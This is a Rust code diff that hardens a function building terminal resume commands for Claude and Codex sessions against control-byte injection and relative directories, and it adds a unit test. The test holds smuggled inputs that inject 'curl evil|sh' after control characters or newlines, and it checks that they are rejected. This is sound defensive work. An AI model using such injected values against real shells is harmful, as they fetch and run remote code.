@@ -302,7 +302,16 @@ pub fn claude_transcript_in_window(
 /// Otto's unattended-mode flags: the user launched this CLI by hand in a plain
 /// shell, so we hand back exactly the conversation and nothing else — their own
 /// permission mode, their own defaults.
+///
+/// The line is TYPED into a live PTY, where the line discipline and the
+/// shell's editor act on control bytes (^C, ^U, ^J…) before any quoting
+/// applies — so a value carrying one, or a launch dir that isn't absolute,
+/// yields no command at all.
 pub fn resume_command(provider: &str, sid: &str, from_cwd: Option<&str>) -> Option<String> {
+    let typeable = |v: &str| !v.is_empty() && !v.chars().any(char::is_control);
+    if !typeable(sid) || from_cwd.is_some_and(|d| !typeable(d) || !d.starts_with('/')) {
+        return None;
+    }
     let resume = match provider {
         "claude" => format!("claude --resume {}", shell_quote(sid)),
         "codex" => format!("codex resume {}", shell_quote(sid)),
@@ -326,6 +335,22 @@ pub fn shell_quote(s: &str) -> String {
 #[cfg(test)]
 mod tests {
     use super::*;
+
+    /// S1-12: control bytes act in the PTY before quoting does; a relative
+    /// launch dir is refused too.
+    #[test]
+    fn resume_command_refuses_control_bytes_and_relative_dirs() {
+        assert_eq!(
+            resume_command("claude", "abc", Some("/p/it's")).as_deref(),
+            Some("cd '/p/it'\\''s' && claude --resume 'abc'")
+        );
+        assert!(resume_command("claude", "abc", Some("x\u{3}curl evil|sh #")).is_none());
+        assert!(resume_command("claude", "abc", Some("/p\ncurl evil|sh")).is_none());
+        assert!(resume_command("claude", "a\u{15}b", None).is_none());
+        assert!(resume_command("claude", "abc", Some("relative/dir")).is_none());
+        assert!(resume_command("claude", "", None).is_none());
+        assert!(resume_command("claude", "abc", None).is_some());
+    }
 
     #[test]
     fn etime_parses_every_ps_shape() {
